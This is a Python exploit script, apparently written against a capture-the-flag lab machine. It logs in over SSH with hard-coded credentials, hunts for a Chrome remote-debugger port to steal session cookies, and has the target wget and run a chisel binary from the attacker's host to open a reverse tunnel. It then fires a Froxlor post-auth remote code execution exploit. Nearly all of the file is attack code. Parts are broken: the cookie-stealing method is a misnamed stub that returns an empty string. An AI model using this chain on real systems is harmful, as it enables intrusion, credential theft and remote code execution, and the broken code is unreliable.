import sys
import site

import argparse
import requests
from urllib.parse import urlencode
from pwn import *
import threading 
import logging 
import json 


# From exploit-tool-box
from  malay_toolbox import MalaySSHClient, run_ssh_interactive_shell, Channel, SSHClient, setup_local_chisel_server, parse_netstat_output
from froxlor_rce import FroxlorPostAuthRCE

logging.basicConfig(level=logging.DEBUG)  # Set the minimum logging level
logging.getLogger("paramiko").setLevel(logging.WARNING)


class Exploit: 
    def __init__(self):
        self.target_ip = "10.10.11.32"
        self.froxlor_webui_port = "8080"
        self.attacker_ip = "10.10.14.159"
        self.ssh_creds = {
            "username": "michael",
            "password": "insaneclownposse"
        }
        self.chisel_fingerprint = ""
        self.serve_chisel_elf_port = "12345"
        self.channel = None
        self.ssh_client = MalaySSHClient(self.target_ip, self.ssh_creds["username"], self.ssh_creds["password"])
        

    def exploit(self):
        self.chisel_fingerprint = setup_local_chisel_server()
        logging.info("initial access to target over ssh")
        self.ssh_client.connect_with_ssh(self._actions_over_ssh)


    def _actions_over_ssh(self, channel: Channel, _: SSHClient):
        self.channel = channel
        
        webSocketDebuggerUrl, _  = self.get_chrome_debugger_info()
        
        cookie = self.steal_chrome_cookies(webSocketDebuggerUrl)
        
        self.exploit_froxlor(cookie)

        return 
    
    
    def get_chrome_debugger_info(self):
        result = self.ssh_client.execute_command("netstat -nlt")
        
        for listener in parse_netstat_output(result):
            try:
                port = listener["port"]
                command = f'wget -qO- http://127.0.0.1:{port}/json'
                
                output = self.ssh_client.execute_command(command, timeout=3)
                webSocketDebuggerUrl = self.parse_debugger_port(output)
                
                return  webSocketDebuggerUrl, port 
            except:
                pass    
        
        raise Exception("Couldnt find chrome debugger port")
    
    def parse_debugger_port(self, text: str) -> str:
        parsed = json.loads(text)
        
        if isinstance(parsed, list):
            for item in parsed:
                try:
                    debugger_url = item["webSocketDebuggerUrl"]
                    
                    if debugger_url:
                        logging.info(f"Found chrome debugger url {json.dumps(item, indent=4)} ")
                        return debugger_url
                      
                except:
                    pass
                
        raise Exception("Couldnt parse ")
    
    def steal_chrome_cookie(self, webSocketDebuggerUrl: str) -> str:
        return ""    

    def exploit_froxlor(self, cookie: str):
        
        self.serve_chisel_binary()
        logging.info("Tunneling froxlor web ui")
        self.tunnel_port(self.froxlor_webui_port)
        run_ssh_interactive_shell(self.channel, self.ssh_client)
        
        logging.info("Trying using admin cookies ")
        
        FroxlorPostAuthRCE(self.target_ip, cookie).exploit()
  
    def serve_chisel_binary(self):                
        
        logging.info(f"serving chisel binary on {self.serve_chisel_elf_port}")
        
        # pipe server fd's to current.
        subprocess.Popen(f"python -m http.server {self.serve_chisel_elf_port}".split(' '), stdout=sys.stdout, stderr=sys.stdout, preexec_fn=os.setsid)

    def tunnel_port(self, port: str):
            remote_nic = "127.0.0.1"
            command = f"""
                    attacker_ip=\"{self.attacker_ip}\";
                    cd /tmp ; 
                    wget "http://{self.attacker_ip}:{self.serve_chisel_elf_port}"/chisel ;
                    chmod +x chisel ;
                    ./chisel client --fingerprint  {self.chisel_fingerprint} "{self.attacker_ip}:8080"  R:{port}:{remote_nic}:8080 & "
            """
            logging.getLogger("paramiko").setLevel(logging.DEBUG)
            result = self.channel.exec_command(command)
            logging.getLogger("paramiko").setLevel(logging.WARNING)
            
            logging.info(f"Tunneled: remote port{port} on target nic {remote_nic} to attacker machine")
            return 
    

Exploit().exploit()